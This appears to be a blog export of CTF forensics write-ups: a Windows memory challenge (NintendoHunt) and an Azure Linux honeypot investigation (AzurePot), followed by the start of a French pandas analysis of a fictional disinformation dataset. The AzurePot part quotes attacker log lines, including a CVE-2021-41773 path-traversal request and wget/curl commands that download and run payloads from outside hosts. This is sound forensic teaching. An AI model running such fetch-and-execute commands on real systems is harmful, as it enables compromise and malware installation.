\u0026#34;da391kdasdaadsssssss t.h.e. fl.ag.is. M2ExOTY5N2YyOTA5NWJjMjg5YTk2ZTQ1MDQ2Nzk2ODA=\u0026#34;, \u0026#34;settings\u0026#34;: ... This is pretty obvious right now; the flag is encoded in base64 and when the string M2ExOTY5N2YyOTA5NWJjMjg5YTk2ZTQ1MDQ2Nzk2ODA= is decoded we got a md5 hash: 3a19697f29095bc289a96e4504679680.\nQ3 What is the process name of the malicious process parent? # Easy question as we found the malicious process, let\u0026rsquo;s look at psscan and I get the answer: explorer.exe.\nQ4 What is the MAC address of this machine\u0026rsquo;s default gateway? # You have to know where default gateway MAC address are located. By chance, I found this write-up\u0026hellip; which is the original challenge^^ 13Cubed Mini Memory CTF Write-up. I was looking for the location of this kind of information and I found the write-up. I don\u0026rsquo;t know how to find the good Windows registry key without the WU\u0026hellip; I think this is a problem when you are a beginner, Windows registry is huge and it\u0026rsquo;s hard to find accurate information.\nAs my research suggested, the hive to investigate is SOFTWARE. First, you have to obtain its offset (virtual column):\n$ vol.py -f memdump.mem --profile=Win10x64_17134 hivelist Virtual Physical Name ------------------ ------------------ ---- ... 0xffffd38985eb3000 0x0000000105738000 \\SystemRoot\\System32\\Config\\SOFTWARE The offset to provide for the following commands is: 0xffffd38985eb3000. The information is located under Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged. There is another randomly (I guess) generated key under it, so you have to find this value first:\n$ vol.py -f memdump.mem --profile=Win10x64_17134 printkey -o 0xffffd38985eb3000 -K \u0026#34;Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged\u0026#34; Legend: (S) = Stable (V) = Volatile ---------------------------- Registry: \\SystemRoot\\System32\\Config\\SOFTWARE Key name: Unmanaged (S) Last updated: 2018-08-01 18:50:26 UTC+0000 Subkeys: (S) 010103000F0000F0080000000F0000F0E3E937A4D0CD0A314266D2986CB7DED5D8B43B828FEEDCEFFD6DE7141DC1D15D Values: You have the randomly (?) generated name, so let\u0026rsquo;s dig into it:\n$ vol.py -f memdump.mem --profile=Win10x64_17134 printkey -o 0xffffd38985eb3000 -K \u0026#34;Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged\\010103000F0000F0080000000F0000F0E3E937A4D0CD0A314266D2986CB7DED5D8B43B828FEEDCEFFD6DE7141DC1D15D\u0026#34; Legend: (S) = Stable (V) = Volatile ---------------------------- Registry: \\SystemRoot\\System32\\Config\\SOFTWARE Key name: 010103000F0000F0080000000F0000F0E3E937A4D0CD0A314266D2986CB7DED5D8B43B828FEEDCEFFD6DE7141DC1D15D (S) Last updated: 2018-08-01 18:50:26 UTC+0000 Subkeys: Values: REG_SZ ProfileGuid : (S) {596B8D0F-BFBC-4B67-9ED8-237BD3DDABF3} REG_SZ Description : (S) Network REG_DWORD Source : (S) 8 REG_SZ DnsSuffix : (S) localdomain REG_SZ FirstNetwork : (S) Network REG_BINARY DefaultGatewayMac : (S) 0x00000000 00 50 56 fe d8 07 We found DefaultGatewayMac key: 00:50:56:fe:d8:07.\nQ5 What is the name of the file that is hidden in the alternative data stream # Very interesting question as I didn\u0026rsquo;t know what is ADS (alternate data stream) before. From what I understand, it\u0026rsquo;s a way for hackers to hide some malicious file \u0026ldquo;behind\u0026rdquo; an innocent one (more informations here: SANS - ADS). To detect this with Volatility you have to use mftparser plugin, but in verbose mode (-v). As the output is large (~50MB), you have to filter on it. According to this website: Executable and Data Files, a way to detect an ADS is to filter on $DATA ADS:\n$ vol.py -f memdump.mem --profile=Win10x64_17134 mftparser -v|grep \u0026#39;$DATA ADS\u0026#39; $DATA ADS Name: $Bad $DATA ADS Name: $Max $DATA ADS Name: Zone.Identifier $DATA ADS Name: yes.txt The hidden one is yes.txt.\nIf you want to go further, the displayed one is Users\\CTF\\Desktop\\test.txt and it\u0026rsquo;s linked with the hiden file yes.txt, there is the MFT entry below. You can either see the contents of both files:\nMFT entry found at offset 0x126515800 Attribute: In Use \u0026amp; File Record Number: 117434 Link count: 1 $STANDARD_INFORMATION Creation Modified MFT Altered Access Date Type ------------------------------ ------------------------------ ------------------------------ ------------------------------ ---- 2018-08-01 19:40:27 UTC+0000 2018-08-01 19:40:56 UTC+0000 2018-08-06 18:12:15 UTC+0000 2018-08-01 19:40:56 UTC+0000 Archive $FILE_NAME Creation Modified MFT Altered Access Date Name/Path ------------------------------ ------------------------------ ------------------------------ ------------------------------ --------- 2018-08-01 19:40:27 UTC+0000 2018-08-01 19:40:27 UTC+0000 2018-08-01 19:40:27 UTC+0000 2018-08-01 19:40:27 UTC+0000 Users\\CTF\\Desktop\\test.txt $OBJECT_ID Object ID: 618163e8-bf95-e811-8415-784f437cb8f9 Birth Volume ID: 80000000-2800-0000-0000-000000000100 Birth Object ID: 09000000-1800-0000-6869-207468657265 Birth Domain ID: 2e071800-0000-0200-8000-000048000000 $DATA 0000000000: 68 69 20 74 68 65 72 65 2e hi.there. $DATA ADS Name: yes.txt 0000000000: 4f 6f 6f 68 2e 2e 2e 20 63 6f 75 6c 64 20 74 68 Oooh....could.th 0000000010: 69 73 20 62 65 20 61 20 66 6c 61 67 3f is.be.a.flag? Q6 What is the full path of the browser cache created when the user visited \u0026ldquo;www.13cubed.com\u0026rdquo; ? # My first idea was to look at the internet history using iehistory plugin. Unfortunately, the tool does not return anything. But the cache is a manipulated file and we could see its path in the MFT. Using the mftparser -v output of the previous question, I investigate on it. I don\u0026rsquo;t know where is located the browser cache so I was stuck on the question for a while. I searched the occurences of \u0026ldquo;cache\u0026rdquo;, \u0026ldquo;cache\u0026quot; but the number of results discouraged me.\nI finally searched for the domain name, 13cubed\u0026hellip; and found one result!\n$ cat mftparser_verbose|grep \u0026#39;13cubed\u0026#39; 2018-08-01 19:29:27 UTC+0000 2018-08-01 19:29:27 UTC+0000 2018-08-01 19:29:27 UTC+0000 2018-08-01 19:29:27 UTC+0000 Users\\CTF\\AppData\\Local\\Packages\\MICROS~1.MIC\\AC\\#!001\\MICROS~1\\Cache\\AHF2COV9\\13cubed[1].htm The output shows the file location which is the flag:\nC:\\Users\\CTF\\AppData\\Local\\Packages\\MICROS~1.MIC\\AC\\#!001\\MICROS~1\\Cache\\AHF2COV9\\13cubed[1].htm Good to know:\nyou can retrieve a part of internet history using the MFT\nthe cache filename contains the domain\u0026rsquo;s website, which is very usefull for sorting the results\nHope you enjoyed the WU :)\n","date":"3 mai 2023","permalink":"/write-up/cyberdefenders-digital-forensics-nintendohunt/","section":"Write-up","summary":"This is my proposed solution for the cyberdefenders’s challenge NintendoHunt (difficult) published on April 27, 2023.","title":"Cyberdefenders · Digital Forensics · NintendoHunt"},{"content":"This is my proposed solution for the cyberdefenders\u0026rsquo;s challenge AzurePot published on April 20, 2023.\nThe scenario :\nThis Ubuntu Linux honeypot was put online in Azure in early October to watch what happens with those exploiting CVE-2021-41773.\nInitially, there was a large number of crypto miners that hit the system. You will see one cron script meant to remove files named kinsing in /tmp. This was a way of preventing these miners so more interesting things could occur.\nThere are three files:\nsdb.vhd.gz VHD of the main drive obtained through an Azure disk snapshot ubuntu.20211208.mem.gz Dump of memory using Lime uac.tgz Results of UAC running on the system Items were obtained in the order above - the drive was snapshotted, memory was grabbed, then UAC was run.\nHelpful Tools:\nFTK Imager (not mandatory; you can mount the vhd file on Linux) Text Editor (I like VsCode since it\u0026rsquo;s much efficient than gedit or sublime for large files) grep awk (not used here) Volatility2 and 3 (not mentionned in the scenario but useful for the two last questions) NOTA :\nFor the first 9 questions, you have to browse the disk dump file (sdb.vhd). You can use FTK Imager or you can mount it on Linux. I used this tutorial: How to mount Virtual Hard disk (VHD) file in Ubuntu Linux? because I have neither Windows nor Wine.\nQ1 There is a script that runs every minute to do cleanup. What is the name of the file? # file: sdb.vhd\nI you don\u0026rsquo;t know what cron files are, look for scripts that run periodically. On a Linux system you can find it here: /var/spool/cron/crontabs.\n... # m h dom mon dow command * * * * * /root/.remove.sh Answer : .remove.sh\nQ2 The script in the Q#1 terminates processes associated with two Bitcoin miner malware files. What is the name of 1st malware file? # file: sdb.vhd\nScenario gives a hint: You will see one cron script meant to remove files named kinsing in /tmp.\nSo in /tmp I list all the files:\n# ls -lah total 2,4G drwxrwxrwt 9 root root 12K déc. 8 2021 . drwxr-xr-x 23 root root 4,0K déc. 4 2021 .. drwxrwxrwt 2 root root 4,0K oct. 9 2021 .font-unix drwxrwxrwt 2 root root 4,0K oct. 9 2021 .ICE-unix -r--r--r-- 1 root root 0 oct. 9 2021 kdevtmpfsi -r--r--r-- 1 root root 3,8M oct. 11 2021 kdevtmpfsi324024279 -r--r--r-- 1 root root 3,8M oct. 11 2021 kdevtmpfsi824415644 -r--r--r-- 1 root root 0 oct. 9 2021 kinsing ... The first one is kinsing (oct) and this this the answer.\nThe script in Q#1 changes the permissions for some files. What is their new permission? # file: sdb.vhd\nQ1 gives me location of .remove.sh, I print its content :\n# cat root/.remove.sh #!/bin/bash for PID in `ps -ef | egrep \u0026#34;kinsing|kdevtmp\u0026#34; | grep \u0026#34;/tmp\u0026#34; | awk \u0026#39;{ print $2 }\u0026#39;` do kill -9 $PID done chown root.root /tmp/k* chmod 444 /tmp/k* The script changes permissions to 444.\nQ4 What is the sha256 of the botnet agent file? # file: sdb.vhd\nThe botnet agent is not located on /tmp but on /var/tmp I don\u0026rsquo;t know why, maybe to hide and not locate it in the same directory as the cryptomineers. In this directory you could see an executable file and calculate its sha256 sum :\n# ls -lah var/tmp total 68K drwxrwxrwt 5 root root 4,0K déc. 8 2021 . drwxr-xr-x 13 root root 4,0K sept. 28 2021 .. drwxrwxrwt 2 root root 4,0K oct. 9 2021 cloud-init -rwxr-xr-x 1 daemon daemon 48K nov. 11 2021 dk86 ... # sha256sum var/tmp/dk86 0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049 var/tmp/dk86 Q5 What is the name of the botnet in Q#4? # file: sdb.vhd\nPut the hash into VirusTotal and you will see that the popular threat label is trojan.linux/tsunami.\nQ6 What IP address matches the creation timestamp of the botnet agent file in Q#4? # file: sdb.vhd\nThe CVE-2021-41773 is related to Appache2 (scenario). Check the Apache2 log files will be helpful in answering the following questions. Theses files are located on /var/log/apache2/access_log file. Unfortunately, access_log and error_log files are too big for a raw investigation. The tip is to filter on the creation timestamp of dk86:\n# stat var/tmp/dk86 Fichier : var/tmp/dk86 Taille : 48748 Blocs : 96 Blocs d\u0026#39;E/S : 4096 fichier Périphérique : 3ah/58d\tInœud : 921 Liens : 1 Accès : (0755/-rwxr-xr-x) UID : ( 1/ daemon) GID : ( 1/ daemon) Accès : 2021-11-11 20:09:51.454413754 +0100 Modif. : 2021-11-11 20:09:51.454413754 +0100 Changt : 2021-11-11 20:09:51.454413754 +0100 Créé : - Be carreful timezone is displayed as +1 so you have to substract one hour to keep the timezone of the disk dump.\nUse grep on the access_log (error_log does not return anything) and you have the botnet agent IP:\ngrep 11/Nov/2021:19:09:51 var/log/apache2/access_log 141.135.85.36 - - [11/Nov/2021:19:09:51 +0000] \u0026#34;POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1\u0026#34; 200 - \u0026#34;-\u0026#34; \u0026#34;-\u0026#34; Q7 What URL did the attacker use to download the botnet agent? # file: sdb.vhd\nI\u0026rsquo;m not sure of my reasoning, but as the attacker tried to exploit Apache2, interesting fingerprints were recorded in error_log. At this time we know this:\nbotnet agent name: dk86 attacker exploit tries to exploit CVE-2021-41773 a quick look inside error_log show that there is a bash injection timestamp of the botnet file creation : 11/Nov/2021:19:09:51 (the dowloading timestamp must be smaller) Assuming the hacker downloaded the botnet agent earlier in the day, we could create an accurate filter. I assume the attacker used curl or grep to download the payload.\n# grep -E \u0026#39;Nov 11 .* 2021.* (wget|curl).*dk86\u0026#39; var/log/apache2/error_log [Thu Nov 11 19:07:41.956674 2021] [dumpio:trace7] [pid 804:tid 139978797401856] mod_dumpio.c(103): [client 141.135.85.36:51774] mod_dumpio: dumpio_in (data-HEAP): echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 \u0026amp;; [Thu Nov 11 19:07:41.962142 2021] [cgi:error] [pid 804:tid 139978797401856] [client 141.135.85.36:51774] AH01215: /bin/bash: line 1: `echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 \u0026amp;;\u0026#39;: /bin/bash [Thu Nov 11 19:09:29.415116 2021] [dumpio:trace7] [pid 803:tid 139978805794560] mod_dumpio.c(103): [client 141.135.85.36:51978] mod_dumpio: dumpio_in (data-HEAP): echo; wget -O /tmp/dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; URL appears !\nQ8 What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself? # file: sdb.vhd\nTricky question because the attacker does not used the same C2 serveur as in the previous question. A grep filter on http://138.197.206.223:80 returns nothing more than the previous question. My thinking was to expand my timestamp filter (no longer on the day but on the whole month of November) and look at the injected bash.\n# grep -E \u0026#39;Nov.*2021.*(wget|curl)\u0026#39; var/log/apache2/error_log [Mon Nov 01 10:15:10.895210 2021] [dumpio:trace7] [pid 4449:tid 139978898114304] mod_dumpio.c(103): [client 195.19.192.26:38080] mod_dumpio: dumpio_in (data-HEAP): A=|echo;(curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh)|bash ... We need more accuracy in the filter. Some of the matches are on error on curl or wget so we could improve the regex in order to catch only the commands and not the error (adding \u0026rsquo; \\-\u0026rsquo; at the end catch the command line and exclude error messages):\n# grep -E \u0026#39;Nov.*2021.*(wget|curl) \\-\u0026#39; var/log/apache2/error_log [Mon Nov 01 10:15:10.895210 2021] [dumpio:trace7] [pid 4449:tid 139978898114304] mod_dumpio.c(103): [client 195.19.192.26:38080] mod_dumpio: dumpio_in (data-HEAP): A=|echo;(curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh)|bash ... Even better, we could see that the attacker dowloaded strings encoded in base64. Let\u0026rsquo;s retrieve all the b64 encoded strings and decode:\n...grep flags ... --data-urlencode \u0026#39;s=UE...Cg==\u0026#39; -o .install; chmod +x .install; sh .install \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; echo \u0026#39;Done\u0026#39; else echo \u0026#39;Already install. Started\u0026#39;; cd .log/101068/.spoollog \u0026amp;\u0026amp; sh .cron.sh \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; fi else echo \u0026#39;Already install Running\u0026#39; fi Two interesting things:\na file named .install an another string encoded in base64 let\u0026rsquo;s decode it ... rm -rf .install The file .install remove itself, this is the flag !\nQ9 The attacker downloaded sh scripts. What are the names of these files? # file: sdb.vhd\n0_cron.sh, 0_linux.sh, ap.sh\nAt the previous step, you might found theses files. But we can found theses files applying this filter:\n# grep -Eo \u0026#39;(curl|wget).*.{5}\\.sh\u0026#39; var/log/apache2/error_log|uniq curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh curl -o- http://86.105.195.120/cleanfda/init.sh curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh ... There is some bash files and I think they are all potentially malicious. But the ones that fit the expected pattern are :\n0_cron.sh\n0_linux.sh\nap.sh\nQ10 Two suspicious processes were running from a deleted directory. What are their PIDs? # file: uac\nWe are searching for processes so let\u0026rsquo;s explore the live_response/process folder. We could see that some of the files are named with a command name (for example ps.txt). A command used to link a process with a deleted directory is lsof so let\u0026rsquo;s check lsof_-nPl.txt. Inside, the NAME column seems to indicate the location of the process, let\u0026rsquo;s search for deleted directory.\n# grep \u0026#39;deleted\u0026#39; live_response/process/lsof_-nPl.txt COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME none 609 0 txt REG 0,1 8632 15254 / (deleted) sleep 6388 1 cwd DIR 8,17 0 528743 /var/tmp/.log/101068/.spoollog (deleted) sh 20645 1 cwd DIR 8,17 0 528743 /var/tmp/.log/101068/.spoollog (deleted) sh 20645 1 10r REG 8,17 9087 528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted) agettyd 24330 1 txt REG 8,17 7244192 30248 /tmp/agettyd (deleted) agettyd 24330 7897 1 txt REG 8,17 7244192 30248 /tmp/agettyd (deleted) agettyd 24330 24333 1 txt REG 8,17 7244192 30248 /tmp/agettyd (deleted) agettyd 24330 24334 1 txt REG 8,17 7244192 30248 /tmp/agettyd (deleted) agettyd 24330 24335 1 txt REG 8,17 7244192 30248 /tmp/agettyd (deleted) agettyd 24330 24336 1 txt REG 8,17 7244192 30248 /tmp/agettyd (deleted) agettyd have a valide name, which does not mean that is not a malicious process, but there it is more suspicious: src.sh (PID 20645); it appears in the error_log file. At the same place, there was an another process was running : PID 6388. We have our two PIDs.\nQ11 What is the suspicious command line associated with the 2nd PID in Q#10? # file: uac\nTo link command line and PID we can use ps -e and we have ps_-ef.txt file. Let\u0026rsquo;s grep it and get the command line:\n# grep 20645 live_response/process/ps_-ef.txt UID PID PPID C STIME TTY TIME CMD daemon 20645 1 0 Nov14 ? 03:01:59 sh .src.sh Q12 UAC gathered some data from the second process in Q#10. What is the remote IP address and remote port that was used in the attack? # file: uac\nThe gathered datas are in live_response/process/proc/\u0026lt;num_proc\u0026gt;. The environ.txt file contains some interesting informations:\n... REMOTE_ADDR=116.202.187.77 ... REMOTE_PORT=56590 ... Q13 Which user was responsible for executing the command in Q#11? # file: uac\nIn the Q11 (ps_-ef.txt), we have the response: deamon.\nQ14 Two suspicious shell processes were running from the tmp folder. What are their PIDs? # file: uac\nLike in the Q10, we can link the location with the PIDs in lsof_-nPl.txt and filter using grep:\n# grep -E \u0026#39;sh.*\\/tmp\u0026#39; live_response/process/lsof_-nPl.txt COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME sh 15853 1 cwd DIR 8,17 12288 4059 /tmp sh 20645 1 cwd DIR 8,17 0 528743 /var/tmp/.log/101068/.spoollog (deleted) sh 20645 1 10r REG 8,17 9087 528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted) sh 21785 1 cwd DIR 8,17 12288 4059 /tmp Two new PIDs appear: 15853 and 21785 (20645 was already known).\nQ15 What is the MAC address of the captured memory? # file: ubuntu.20211208.mem\nThe most technical part of the challenge begin here. Some of the information may be incorrect, I have recently learned these concepts and I am not comfortable with creating profiles and kernel specification yet. I think you could answer the next two questions with strings|grep but it is more exctiting to create a custom profile.\nSince the dump was not made on a Windows machine, Volatility2 can\u0026rsquo;t parse natively the mem file, we have to build our own profile. I follow this tutorial to make the profile: Security Post-it #3 – Volatility Linux Profiles.\nUsing Volatility3 you can get the kernel version of the mem dump:\n# volatility3 -f ubuntu.20211208.mem banner Volatility 3 Framework 2.4.2 Progress: 100.00\tPDB scanning finished Offset\tBanner 0x312001a0\tLinux version 5.4.0-1059-azure (buildd@lcy01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #62~18.04.1-Ubuntu SMP Tue Sep 14 17:53:18 UTC 2021 (Ubuntu 5.4.0-1059.62~18.04.1-azure 5.4.140) So this the kernel version is 5.4.0-1059-azure, and it is a Ubuntu 18.04.\nNext, go to the linux tool directory in vol2 and modify the KVER variable in Makefile with the kernel version:\n# cd volatility/tools/linux # The KVER variable must contains the kernel version (volatility/tools/linux/Makefile): KVER ?= 5.4.0-1059-azure Next, run a Docker container using a Ubuntu 18.04 image (the Ubuntu version where was dumped the RAM). Note that other Ubuntu version will not work, you have to use the same version.\n# docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash Note that the d# symbol represents the container prompt. Update the OS and install the following tools:\nbuild-essential dwarfdump make zip Most important: install linux-image-\u0026lt;kernel_version\u0026gt; and linux-headers-\u0026lt;kernel_version\u0026gt;. For the challenge the packages will be:\nlinux-image-5.4.0-1059-azure linux-headers-5.4.0-1059-azure Once all is installed, go to the volatility directory and build the dwarf-tools file:\nd# cd /volatility d# make make -C //lib/modules/5.4.0-1059-azure/build CONFIG_DEBUG_INFO=y M=\u0026#34;/volatility\u0026#34; modules make[1]: Entering directory \u0026#39;/usr/src/linux-headers-5.4.0-1059-azure\u0026#39; CC [M] /volatility/module.o Building modules, stage 2. MODPOST 1 modules CC [M] /volatility/module.mod.o LD [M] /volatility/module.ko make[1]: Leaving directory \u0026#39;/usr/src/linux-headers-5.4.0-1059-azure\u0026#39; dwarfdump -di module.ko \u0026gt; module.dwarf make -C //lib/modules/5.4.0-1059-azure/build M=\u0026#34;/volatility\u0026#34; clean make[1]: Entering directory \u0026#39;/usr/src/linux-headers-5.4.0-1059-azure\u0026#39; CLEAN /volatility/Module.symvers make[1]: Leaving directory \u0026#39;/usr/src/linux-headers-5.4.0-1059-azure\u0026#39; IMPORTANT: if you encounter an error relative to a missing licence in /volatility/module.c, then add this line at this end of module.c:\nMODULE_LICENSE(\u0026#34;GPL\u0026#34;); Finnaly, build the profile (Ubuntu-azure.zip):\nd# zip Ubuntu-azure.zip module.dwarf /boot/System.map-5.4.0-1059-azure /boot/System.map-5.4.0-1059-azure should exists inside your Docker. If not, you have not installed the right kernel packages. Quit the Docker and copy the Ubuntu-azure.zip file into volatility/plugins/overlays/linux.\nDo you have built the profile correctly? Let\u0026rsquo;s try to use it in Volatility:\n# #display information about vol profiles # python2 vol.py --info|grep Profile Volatility Foundation Volatility Framework 2.6.1 Profiles LinuxUbuntu-azurex64 - A Profile for Linux Ubuntu-azure x64 ... If you see LinuxUbuntu-azurex64 chances are your profile is valid, let\u0026rsquo;s test it. We are looking for the MAC address of the machine, according to the [vol2 documentation] (https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf), linux_ifconfig should give me the answer.\n# python2 vol.py -f ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_ifconfig Volatility Foundation Volatility Framework 2.6.1 Interface IP Address MAC Address Promiscous Mode ---------------- -------------------- ------------------ --------------- lo 127.0.0.1 00:00:00:00:00:00 False eth0 10.0.0.4 00:22:48:26:3b:16 False Here we go! The eth0 MAC address is the good answer :)\nQ16 From Bash history. The attacker downloaded an sh script. What is the name of the file? # file: ubuntu.20211208.mem\nlinux_bash plugin gives the bash history, let\u0026rsquo;s make a grep on the output:\n# python2 vol.py -f ubuntu.20211208.mem --profile=LinuxUbuntu-azurex64 linux_bash|grep -E \u0026#39;(wget |curl ).*\\.sh\u0026#39; Volatility Foundation Volatility Framework 2.6.1 4205 bash 2021-12-08 16:12:31 UTC+0000 wget http://88.218.227.141/wget.sh 4205 bash 2021-12-08 16:12:31 UTC+0000 wget http://185.191.32.198/unk.sh 9331 bash 2021-12-08 16:18:01 UTC+0000 grep curl error_log | grep \u0026#34;.sh 9331 bash 2021-12-08 16:18:01 UTC+0000 grep curl error_log | grep \u0026#34;.sh\u0026#34; 9331 bash 2021-12-08 16:18:01 UTC+0000 grep curl error_log | grep \u0026#34;\\.sh\u0026#34; Both of the IP are reported as malicious on VirusTotal, so I think the attacker downloaded at least two malicious files via bash. The only files that matches the pattern is unk.sh.\n","date":"24 avril 2023","permalink":"/write-up/cyberdefenders-digital-forensics-azurepot/","section":"Write-up","summary":"This is my proposed solution for the cyberdefenders\u0026rsquo;s challenge AzurePot published on April 20, 2023.","title":"Cyberdefenders · Digital Forensics · Azurepot"},{"content":"FR\nTous mes write-up, plus ou moins bien rangés.\nEN\nAll my write-up, more or less tidy.\n","date":"24 avril 2023","permalink":"/write-up/","section":"Write-up","summary":"FR\nTous mes write-up, plus ou moins bien rangés.\nEN","title":"Write-up"},{"content":"Article de blog écrit à la suite du Tournois de Renseignement et d\u0026rsquo;Analyse de CentraleSupélec (TRACS) édition 2022. En quelques mots, ce tournois a été l\u0026rsquo;occasion de concourir sur des thématiques diverses comme la data science, la cybersécurité ou encore la cryptanalyse.\nCet article reprend le challenge \u0026ldquo;Fakenews\u0026rdquo; de cette compétition et apporte la solution (writeup) que mon équipe et moi-même avons élaborés. Il se base sur un scénario fictif détaillé ci-dessous.\nLe contexte et le challenge # Le sujet du challenge pose le ton :\nSur TikBook, le principal réseau social du pays géré par la très puissante Eve Hilboss, circulent de nombreux éléments discréditant Paul Hityck. SOS (Special Operations Services), les services spécieux Indiumlandais, soupçonnent les liens entre Eve Hilboss et les services secrets eviliens. Ils demandent un appui pour soutenir leurs opérations sur ce dossier.\nPour simplifier la trame scénaristique, nous devons trouver le pseudo qui est à l\u0026rsquo;origine d\u0026rsquo;une \u0026ldquo;campagne de désinformation\u0026rdquo; qui touche Paul Hityck.\nPar abus de langage, et pour simplifier la lecture, on va dire que les données sont issues de Twitter. En effet, les données du challenge indiquent un réseau social très proche de l\u0026rsquo;oiseau bleu. Je vais donc parler de tweet (contenu posté sur le réseau par un compte) et de RT (re-tweet ; lorsqu\u0026rsquo;un utilisateur partage le message d\u0026rsquo;un autre, en y ajoutant ou non du contenu), qui font partie du vocabulaire utilisé pour Twitter.\nNotez bien que les données fournies ici sont fictives, elles ne sont en aucun cas tirées d\u0026rsquo;un quelconque réseau social. Elles ont été générées pour le challenge. Avec le contexte vient le fichier sur lequel nous allons travailler. Il est conséquent ; plus de 60Mo de texte. Il contient tous les tweets publiés, et leurs informations associées, sur une période de temps. Voici un extrait du fichier :\n,Unnamed: 0,index,text,username,date 4458322,6879731,3283915,Money aint nothing if u know how to make it!,antoinepayet,2022-09-01 00:00:16 4458417,5923872,5504693,\u0026#34;RT @tboulanger: I\u0026#39;m buying new uggs tomorrow, Probly 2 pairs.... (Bbmthinkingface)\u0026lt;- dog, its march.. Give it up.\u0026#34;,leclerchenri,2022-09-01 00:08:56 La première ligne nous renseigne sur la façon dont sont stockées les données et ce qu\u0026rsquo;elles représentent. On observe que nous disposons d\u0026rsquo;un index, du texte (le tweet en lui-même), d\u0026rsquo;un pseudo (username), qui est la personne qui a publié le tweet, et de la date. Il y a environ 500 000 lignes, soit autant de tweet.\nUne aiguille dans une botte de foin # Comment s\u0026rsquo;y retrouver dans une telle masse de données ? Il y a clairement trop de tweet pour tous les lire, alors comment arriver à identifier le pseudo qui serait à l\u0026rsquo;origine d\u0026rsquo;une \u0026ldquo;campagne de désinformation\u0026rdquo; ? Il va faloir utiliser des outils adaptés et essayer d\u0026rsquo;être malin. En effet, face à autant de donnée, et dans un temps limité (la compétition durait une journée), il est essentiel d\u0026rsquo;aller droit au but et de ne pas ré-inventer la roue.\nUn panda et un serpent à la rescousse # Nous allons utiliser le langage Python et la librairie pandas voir ici pour les curieux. Cette librairie regroupe un ensemble d\u0026rsquo;outil très pratiques lorsqu\u0026rsquo;il s\u0026rsquo;agit de traiter de gros volumes de données. Même si on ne travaille pas sur des volumes de données incroyablement grands, l\u0026rsquo;optimisations et les outils déjà mis en place dans pandas vont nous en faire gagner.\nLa suite contient du code. Il n\u0026rsquo;y a pas besoin de s\u0026rsquo;y connaître en code pour comprendre l\u0026rsquo;article. Le code est là pour satisfaire les profils plus techniques. Cet article n\u0026rsquo;est pas non plus un tutoriel pour apprendre à utiliser la librairie pandas. Une vue d\u0026rsquo;ensemble # Une première étape pour démêler tout ça est de connaître un peu mieux notre dataset (i.e : l\u0026rsquo;ensemble des données). Pour cela on peut faire quelques statistiques génériques, par exemples savoir combien de comptes sont présents dans notre jeu de données. Pour bien interpêter les résultats, il faut également se demander à quoi ils devraient ressembler. Qu\u0026rsquo;attendons-nous à obtenir ? 10, 10 000, 100 000 ? Intuitivement on devrait voir quelques comptes revenir mais le nombre de compte devrait être dans le même ordre de grandeur que celui des tweets.\n# on commence toujours par ouvrir le fichier csv, cette ligne sera induise par la suite df = pd.read_csv(\u0026#39;elections.csv\u0026#39;, names=[\u0026#39;n1\u0026#39;,\u0026#39;n2\u0026#39;,\u0026#39;index\u0026#39;,\u0026#39;text\u0026#39;,\u0026#39;username\u0026#39;,\u0026#39;date\u0026#39;]) number_of_accounts = len(df[\u0026#39;username\u0026#39;].unique()) Et là\u0026hellip; surprise ! Il n\u0026rsquo;y a que 569 comptes\u0026hellip; pour 500 000 tweets. C\u0026rsquo;est très étrange mais nous y reviendrons. Pour connaître un peu mieux encore notre dataset, on peut compter le nombre de tweets ainsi que le nombre unique de tweets, peut-être qu\u0026rsquo;il y a des tweets identiques ?\nnumber_of_unique_tweets = len(df[\u0026#39;text\u0026#39;].unique()) number_of_tweets = len(df) Là encore, surprise : le nombre de tweet est d\u0026rsquo;environ 500 000 alors que le nombre de tweets uniques est de 243 000\u0026hellip; On a environ la moitié du contenu qui est dupliqué, avec en prime un très faible nombre de compte. Cela semble indiquer un réseau de robot, mais rien de sûr, il va falloir creuser.\nDes robots partout ? # Un très petit nombre de compte, du contenu dupliqué, à priori on est en présence de robots qui publient beaucoup. Pour en être certain nous allons faire un peu de statistiques.\nPremièrement, on peut s\u0026rsquo;intéresser au nombre moyen de tweets publiés par compte :\naverage = df.mean() En moyenne un compte publie 903 tweets. On pourrait penser que c\u0026rsquo;est énorme et pourtant cet indicateur est limité. En effet, une petite population de compte sur une longue période pourraient produire le même résultat sans pour autant héberger des robots. Plutôt que de s\u0026rsquo;intéresser à la durée de la capture des tweets, on va plutôt regarder si des comptes postent beaucoup tandis que d\u0026rsquo;autres non.\nPour cela on va utiliser l\u0026rsquo;écart type qui mesure l\u0026rsquo;écart à la moyenne, vous trouverez plus d\u0026rsquo;information ici : Wikipédia : Écart type. Pour résumer il va nous indiquer si des comptes publient beaucoup, tandis que d\u0026rsquo;autres moins. Un écart type important va indiquer une grande disparité d\u0026rsquo;activité entre les comptes et inversement.\naverage = df.std() Le résultat confirme l\u0026rsquo;intuition ; l\u0026rsquo;écart type est de 4088. Cela signifie que certains compte postent énormément par rapport à d\u0026rsquo;autre. 